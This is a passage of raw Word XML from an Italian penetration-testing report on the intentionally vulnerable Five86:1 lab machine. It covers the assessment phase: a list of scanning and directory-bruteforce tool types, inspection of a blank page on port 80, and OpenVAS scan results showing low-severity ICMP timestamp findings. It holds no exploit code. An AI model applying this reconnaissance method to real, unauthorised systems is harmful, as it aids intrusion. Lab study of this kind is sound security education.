      <w:r w:rsidRPr="009B45EA">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Assessment</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>. In questa fase andiamo a capire</w:t>
      </w:r>
      <w:r w:rsidR="00251C0D">
        <w:t xml:space="preserve"> e individuare</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> quali sono le debolezze e le vulnerabilità </w:t>
      </w:r>
      <w:r w:rsidR="00251C0D">
        <w:t xml:space="preserve">che possiamo sfruttare a nostro vantaggio. Ovviamente, sapendo che Five-86:1 è una macchina </w:t>
      </w:r>
      <w:r w:rsidR="00251C0D" w:rsidRPr="00B703CC">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>vulnerabile by design</w:t>
      </w:r>
      <w:r w:rsidR="00251C0D">
        <w:t xml:space="preserve"> dovrem</w:t>
      </w:r>
      <w:r w:rsidR="00B01334">
        <w:t>m</w:t>
      </w:r>
      <w:r w:rsidR="00251C0D">
        <w:t>o trovar</w:t>
      </w:r>
      <w:r w:rsidR="00B01334">
        <w:t>ne</w:t>
      </w:r>
      <w:r w:rsidR="00251C0D">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00CD4E7A">
        <w:t>alcune</w:t>
      </w:r>
      <w:r w:rsidR="00251C0D">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26D9B8CA" w14:textId="79C946A0" w:rsidR="00B703BF" w:rsidRDefault="00B703BF" w:rsidP="009B45EA">
      <w:r>
        <w:t>In questa fase verranno utilizzi diversi tool per:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="669B9178" w14:textId="77777777" w:rsidR="00B703BF" w:rsidRDefault="00B703BF">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00B703BF">
        <w:t xml:space="preserve">Web </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B703BF">
        <w:t>Vulnerability</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B703BF">
        <w:t xml:space="preserve"> Scanner</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14EE04D6" w14:textId="77777777" w:rsidR="00B703BF" w:rsidRDefault="00B703BF">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00B703BF">
        <w:t xml:space="preserve">Web Crawler &amp; Directory </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B703BF">
        <w:t>Bruteforce</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="3ED595F8" w14:textId="77777777" w:rsidR="00B703BF" w:rsidRDefault="00B703BF">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00B703BF">
        <w:t>Web Application Proxy</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="472BFFD2" w14:textId="1AF18705" w:rsidR="00B703BF" w:rsidRDefault="00B703BF">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00B703BF">
        <w:t xml:space="preserve">CMS &amp; Framework </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B703BF">
        <w:t>Identification</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="46AEC06A" w14:textId="77777777" w:rsidR="00B703BF" w:rsidRDefault="00B703BF" w:rsidP="009B45EA"/>
    <w:p w14:paraId="4ECD17E6" w14:textId="6591247A" w:rsidR="00DB007C" w:rsidRDefault="00B01334" w:rsidP="00DB007C">
      <w:r>
        <w:t>D</w:t>
      </w:r>
      <w:r w:rsidR="00251C0D">
        <w:t>alla fase precedente</w:t>
      </w:r>
      <w:r>
        <w:t>, abbiamo individuato delle</w:t>
      </w:r>
      <w:r w:rsidR="00251C0D">
        <w:t xml:space="preserve"> porte apert</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">e quindi; </w:t>
      </w:r>
      <w:r w:rsidR="00251C0D">
        <w:t>possiamo andare a richiedere una sessione sulla porta 80</w:t>
      </w:r>
      <w:r w:rsidR="00DB007C">
        <w:t xml:space="preserve">, dove pensiamo di </w:t>
      </w:r>
      <w:r w:rsidR="00251C0D">
        <w:t>t</w:t>
      </w:r>
      <w:r w:rsidR="00DB007C">
        <w:t>rovare</w:t>
      </w:r>
      <w:r w:rsidR="00251C0D">
        <w:t xml:space="preserve"> un</w:t>
      </w:r>
      <w:r w:rsidR="00DB007C">
        <w:t>a</w:t>
      </w:r>
      <w:r w:rsidR="00251C0D">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00251C0D" w:rsidRPr="00251C0D">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Home page</w:t>
      </w:r>
      <w:r w:rsidR="005D0B17">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00DB007C">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00DB007C">
        <w:t xml:space="preserve">Ma andando a effettuare una connessione sulla porta 80 non troviamo </w:t>
      </w:r>
      <w:r w:rsidR="007C1345">
        <w:t>nulla; infatti,</w:t>
      </w:r>
      <w:r w:rsidR="00DB007C">
        <w:t xml:space="preserve"> compare una pagina bianca e per essere sicuri che non ci sia nulla tramite </w:t>
      </w:r>
      <w:r w:rsidR="007C1345" w:rsidRPr="007C1345">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>l’</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="007C1345" w:rsidRPr="007C1345">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>inspector</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="007C1345">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> da sviluppatore</w:t>
      </w:r>
      <w:r w:rsidR="007C1345">
        <w:t xml:space="preserve"> andiamo a controllare la struttura html della pagina web. </w:t>
      </w:r>
      <w:r w:rsidR="00CD4E7A">
        <w:t>Come nel</w:t>
      </w:r>
      <w:r w:rsidR="007C1345">
        <w:t>l’immagine</w:t>
      </w:r>
      <w:r w:rsidR="00CD4E7A">
        <w:t xml:space="preserve"> seguente</w:t>
      </w:r>
      <w:r w:rsidR="007C1345">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25EE3E1F" w14:textId="77777777" w:rsidR="007C1345" w:rsidRDefault="007C1345" w:rsidP="00DB007C"/>
    <w:p w14:paraId="59857AB2" w14:textId="2B3DE89D" w:rsidR="007C1345" w:rsidRDefault="007C1345" w:rsidP="007C1345">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r w:rsidRPr="007C1345">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="06EFF98B" wp14:editId="22E2D4D5">
            <wp:extent cx="5274310" cy="2395220"/>
            <wp:effectExtent l="0" t="0" r="2540" b="5080"/>
            <wp:docPr id="403285934"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85934" name="Immagine 1" descr="Immagine che contiene schermata, testo, software, Software multimediale&#10;&#10;Descrizione generata automaticamente"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId19"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5274310" cy="2395220"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidRPr="00262AA4">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">Figura </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>7</w:t>
      </w:r>
      <w:r w:rsidRPr="00262AA4">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidRPr="007C1345">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>Pagina web sull’indirizzo 10.0.2.4:80</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13264A60" w14:textId="77777777" w:rsidR="00B01334" w:rsidRDefault="00B01334" w:rsidP="00D76587"/>
    <w:p w14:paraId="1A124BBB" w14:textId="3F269E24" w:rsidR="00B01334" w:rsidRDefault="008200C7" w:rsidP="00D76587">
      <w:r>
        <w:t xml:space="preserve">Per </w:t>
      </w:r>
      <w:r w:rsidR="00B01334">
        <w:t>avere altre informazioni iniziamo la nostra fase di</w:t>
      </w:r>
      <w:r w:rsidR="00B01334" w:rsidRPr="00B01334">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00B01334" w:rsidRPr="009B45EA">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Vulnetability</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00B01334" w:rsidRPr="009B45EA">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> Mapping</w:t>
      </w:r>
      <w:r w:rsidR="00B01334" w:rsidRPr="00B01334">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="00B01334">
        <w:t>V</w:t>
      </w:r>
      <w:r w:rsidR="00B01334" w:rsidRPr="00B01334">
        <w:t>erranno introdotti</w:t>
      </w:r>
      <w:r w:rsidR="00B01334">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00B01334">
        <w:t>alcuni tool per estrapolare informazioni sulla macchi a target.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1829691A" w14:textId="6151CE9D" w:rsidR="006A6433" w:rsidRDefault="003F27AD" w:rsidP="003F27AD">
      <w:bookmarkStart w:id="27" w:name="_Toc139378618"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Effettuiamo l’a</w:t>
      </w:r>
      <w:r w:rsidR="006A6433">
        <w:t xml:space="preserve">nalisi </w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r w:rsidR="006A6433">
        <w:t>utomatica</w:t>
      </w:r>
      <w:bookmarkEnd w:id="27"/>
      <w:r>
        <w:t xml:space="preserve"> tramite alcuni tool.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00FED2EF" w14:textId="61D0D9B1" w:rsidR="006A6433" w:rsidRDefault="006A6433" w:rsidP="006A6433">
      <w:r w:rsidRPr="006A6433">
        <w:t xml:space="preserve">Inizialmente sono stati utilizzati diversi strumenti di analisi automatica per evidenziare le vulnerabilità note ed eventualmente sfruttarle. Il tool </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006A6433">
        <w:rPr>
          <w:rFonts w:ascii="SFBX1000" w:hAnsi="SFBX1000"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>OpenVas</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006A6433">
        <w:rPr>
          <w:rFonts w:ascii="SFBX1000" w:hAnsi="SFBX1000"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="006A6433">
        <w:t>è stato utilizzato configurando una scansione di tipo "</w:t>
      </w:r>
      <w:r w:rsidRPr="006A6433">
        <w:rPr>
          <w:rFonts w:ascii="SFTI1000" w:hAnsi="SFTI1000"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>full and fast</w:t>
      </w:r>
      <w:r w:rsidRPr="006A6433">
        <w:t>" specificando l’indirizzo IP della macchina da scansionare e selezionando tutte le porte TCP:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11920ACE" w14:textId="243C4939" w:rsidR="007652F3" w:rsidRDefault="007652F3" w:rsidP="006A6433">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251719680" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="2FABD120" wp14:editId="28C2A304">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="margin">
              <wp:posOffset>486246</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>151293</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="3824605" cy="2949575"/>
            <wp:effectExtent l="0" t="0" r="4445" b="3175"/>
            <wp:wrapSquare wrapText="bothSides"/>
            <wp:docPr id="157689876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460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D01350" w14:textId="23A57015" w:rsidR="007652F3" w:rsidRDefault="007652F3" w:rsidP="007652F3">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="75B7D035" w14:textId="169119FC" w:rsidR="006A6433" w:rsidRDefault="006A6433" w:rsidP="00D76587"/>
    <w:p w14:paraId="5342B604" w14:textId="42EFCA75" w:rsidR="007652F3" w:rsidRDefault="007652F3" w:rsidP="00D76587"/>
    <w:p w14:paraId="59C88507" w14:textId="76651C54" w:rsidR="007652F3" w:rsidRDefault="007652F3" w:rsidP="00D76587"/>
    <w:p w14:paraId="42C81DF4" w14:textId="59151F7B" w:rsidR="007652F3" w:rsidRDefault="007652F3" w:rsidP="00D76587"/>
    <w:p w14:paraId="238FADC0" w14:textId="187A6C5E" w:rsidR="007652F3" w:rsidRDefault="007652F3" w:rsidP="00D76587"/>
    <w:p w14:paraId="36C61D27" w14:textId="74BEFDD6" w:rsidR="007652F3" w:rsidRDefault="007652F3" w:rsidP="00D76587"/>
    <w:p w14:paraId="1C1A715A" w14:textId="18DB81DE" w:rsidR="007652F3" w:rsidRDefault="007652F3" w:rsidP="00D76587"/>
    <w:p w14:paraId="40CBDA45" w14:textId="59FC2BDC" w:rsidR="007652F3" w:rsidRDefault="007652F3" w:rsidP="00D76587"/>
    <w:p w14:paraId="6A9C65DD" w14:textId="3A2B7E67" w:rsidR="007652F3" w:rsidRDefault="007652F3" w:rsidP="00D76587">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251720704" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="5D3B1245" wp14:editId="4C987552">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="column">
              <wp:posOffset>457200</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>6350</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="3870960" cy="3148330"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:wrapSquare wrapText="bothSides"/>
            <wp:docPr id="6698598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0960" cy="314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1D9F2" w14:textId="6D0CEB2E" w:rsidR="007652F3" w:rsidRDefault="00451291" w:rsidP="00D76587">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251734016" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="37EE915F" wp14:editId="4EDEB2BB">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="column">
              <wp:posOffset>1499870</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>186214</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="848995" cy="131445"/>
            <wp:effectExtent l="0" t="0" r="8255" b="1905"/>
            <wp:wrapSquare wrapText="bothSides"/>
            <wp:docPr id="783813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8995" cy="131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F487C" w14:textId="56A01D32" w:rsidR="007652F3" w:rsidRDefault="007652F3" w:rsidP="00D76587"/>
    <w:p w14:paraId="3FD99271" w14:textId="73C18836" w:rsidR="007652F3" w:rsidRDefault="007652F3" w:rsidP="00D76587"/>
    <w:p w14:paraId="0DF5AD0B" w14:textId="46C3982E" w:rsidR="007652F3" w:rsidRDefault="007652F3" w:rsidP="00D76587"/>
    <w:p w14:paraId="7A291DA0" w14:textId="00EBB1B4" w:rsidR="007652F3" w:rsidRDefault="007652F3" w:rsidP="00D76587"/>
    <w:p w14:paraId="5C43C009" w14:textId="77777777" w:rsidR="007652F3" w:rsidRDefault="007652F3" w:rsidP="00D76587"/>
    <w:p w14:paraId="52D6526F" w14:textId="084F49DB" w:rsidR="007652F3" w:rsidRDefault="007652F3" w:rsidP="00D76587"/>
    <w:p w14:paraId="485D86CB" w14:textId="0474CAD0" w:rsidR="007652F3" w:rsidRDefault="007652F3" w:rsidP="00D76587"/>
    <w:p w14:paraId="3AE087EA" w14:textId="6CABAA11" w:rsidR="007652F3" w:rsidRDefault="007652F3" w:rsidP="00D76587"/>
    <w:p w14:paraId="4C2A1B54" w14:textId="3F7C5867" w:rsidR="007652F3" w:rsidRDefault="007652F3" w:rsidP="00D76587"/>
    <w:p w14:paraId="407DC8AC" w14:textId="7A95E6AF" w:rsidR="007652F3" w:rsidRDefault="007652F3" w:rsidP="00D76587">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251721728" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="5A547FB3" wp14:editId="69C2744B">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="margin">
              <wp:align>center</wp:align>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>432967</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="6105525" cy="2470150"/>
            <wp:effectExtent l="0" t="0" r="9525" b="6350"/>
            <wp:wrapSquare wrapText="bothSides"/>
            <wp:docPr id="19214398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5525" cy="247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6FF7F2" w14:textId="2FE20558" w:rsidR="007652F3" w:rsidRDefault="007652F3" w:rsidP="007652F3">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r w:rsidRPr="00B01334">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">Figura 8: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">Configurazioni e Risultati </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>OpenVas</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="6E78C033" w14:textId="47B96C92" w:rsidR="007652F3" w:rsidRPr="005F1DF6" w:rsidRDefault="005F1DF6" w:rsidP="005F1DF6">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F1DF6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Come si evince dalla scansione sono state rilevate due vulnerabilità di grado basso riguardo al </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F1DF6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Timestamps</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F1DF6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="005F1DF6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">del protocollo ICMP che può essere computato e si possono recuperare informazioni riguardo al tempo di attività </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F1DF6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>dell’host</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F1DF6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">, possono essere utilizzate per sfruttare servizi sulla generazione di numeri pseudocasuali deboli basati sul </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F1DF6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>Timestamps</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F1DF6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="254163AA" w14:textId="73A2A55D" w:rsidR="007652F3" w:rsidRPr="00B67E39" w:rsidRDefault="00B67E39" w:rsidP="00D76587">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251732992" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="4BE07B64" wp14:editId="0120EE97">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:posOffset>-33444</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>929217</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="708211" cy="474719"/>
                <wp:effectExtent l="0" t="0" r="15875" b="20955"/>
                <wp:wrapNone/>
                <wp:docPr id="91800395" name="Rettangolo 3"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="708211" cy="474719"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:noFill/>
                        <a:ln w="25400" cap="flat" cmpd="sng" algn="ctr">
                          <a:solidFill>
                            <a:srgbClr val="00B0F0"/>
                          </a:solidFill>
                          <a:prstDash val="solid"/>
                        </a:ln>
                        <a:effectLst/>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="5DE0E8CB" w14:textId="77777777" w:rsidR="00451291" w:rsidRDefault="00451291" w:rsidP="004512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07B64" id="_x0000_s1034" style="position:absolute;left:0;text-align:left;margin-left:-2.65pt;margin-top:73.15pt;width:55.75pt;height:37.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OlxUAIAAJwEAAAOAAAAZHJzL2Uyb0RvYy54bWysVMFu2zAMvQ/YPwi6L3aCdEmDOEXWIsOA&#10;oC3QDj0zshQbkCWNUmJnXz9Kdpqu22nYRSFF+ol8fMzypms0O0r0tTUFH49yzqQRtqzNvuDfnzef&#10;5pz5AKYEbY0s+El6frP6+GHZuoWc2MrqUiIjEOMXrSt4FYJbZJkXlWzAj6yThoLKYgOBXNxnJUJL&#10;6I3OJnn+OWstlg6tkN7T7V0f5KuEr5QU4UEpLwPTBafaQjoxnbt4ZqslLPYIrqrFUAb8QxUN1IYe&#10;fYW6gwDsgPUfUE0t0HqrwkjYJrNK1UKmHqibcf6um6cKnEy9EDnevdLk/x+suD8+uUckGlrnF57M&#10;2EWnsIm/VB/rElmnV7JkF5igy1k+n4zHnAkKTWfT2fg6kpldPnbow1dpGxaNgiPNIlEEx60Pfeo5&#10;Jb5l7KbWOs1DG9YWfHI1zWlkAkgWSkMgs3Flwb3ZcwZ6T3oTAROkt7ou4+cRyON+d6uRHSHOPP+S&#10;b9KYqbLf0uLbd+CrPi+Fhga0iTAyqWco9UJOtEK361hNpczjF/FmZ8vTIzK0vcC8E5ua8LfgwyMg&#10;KYoaoS0JD3Qobak7O1icVRZ//u0+5tOgKcpZSwqlzn8cACVn+pshCVyPp9Mo6eRMr2YTcvBtZPc2&#10;Yg7NrSVCaGJUXTJjftBnU6FtXmiZ1vFVCoER9HbP8eDchn5zaB2FXK9TGsnYQdiaJycieGQuMvvc&#10;vQC6YfSBNHNvz2qGxTsF9Lm9BtaHYFWd5HHhlWQVHVqBJLBhXeOOvfVT1uVPZfULAAD//wMAUEsD&#10;BBQABgAIAAAAIQCD/PL93gAAAAoBAAAPAAAAZHJzL2Rvd25yZXYueG1sTI/LasMwEEX3hf6DmEB3&#10;ifxoTepaDqVQ6CKF5vEBijWxTayRkZTE+ftOVu1uHoc7Z6rVZAdxQR96RwrSRQICqXGmp1bBfvc5&#10;X4IIUZPRgyNUcMMAq/rxodKlcVfa4GUbW8EhFEqtoItxLKUMTYdWh4UbkXh3dN7qyK1vpfH6yuF2&#10;kFmSFNLqnvhCp0f86LA5bc9WgV03rz5+tfn+J1/e1v0uyqP9VuppNr2/gYg4xT8Y7vqsDjU7HdyZ&#10;TBCDgvlLziTPnwsu7kBSZCAOCrIsTUHWlfz/Qv0LAAD//wMAUEsBAi0AFAAGAAgAAAAhALaDOJL+&#10;AAAA4QEAABMAAAAAAAAAAAAAAAAAAAAAAFtDb250ZW50X1R5cGVzXS54bWxQSwECLQAUAAYACAAA&#10;ACEAOP0h/9YAAACUAQAACwAAAAAAAAAAAAAAAAAvAQAAX3JlbHMvLnJlbHNQSwECLQAUAAYACAAA&#10;ACEAUOTpcVACAACcBAAADgAAAAAAAAAAAAAAAAAuAgAAZHJzL2Uyb0RvYy54bWxQSwECLQAUAAYA&#10;CAAAACEAg/zy/d4AAAAKAQAADwAAAAAAAAAAAAAAAACqBAAAZHJzL2Rvd25yZXYueG1sUEsFBgAA&#10;AAAEAAQA8wAAALUFAAAAAA==&#10;" filled="f" strokecolor="#00b0f0" strokeweight="2pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="5DE0E8CB" w14:textId="77777777" w:rsidR="00451291" w:rsidRDefault="00451291" w:rsidP="00451291">
                      <w:pPr>
                        <w:jc w:val="center"/>
                      </w:pPr>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap anchorx="margin"/>
              </v:rect>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidRPr="00B67E39">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251722752" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="1041FA29" wp14:editId="43FE4D77">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="margin">
              <wp:align>right</wp:align>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>2830618</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="5274310" cy="1742440"/>
            <wp:effectExtent l="0" t="0" r="2540" b="0"/>
            <wp:wrapSquare wrapText="bothSides"/>
            <wp:docPr id="1230786468" name="Immagine 1" descr="Immagine che contiene schermata, Software multimediale, Software per la grafic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6468" name="Immagine 1" descr="Immagine che contiene schermata, Software multimediale, Software per la grafica, software&#10;&#10;Descrizione generata automaticamente"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId24"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
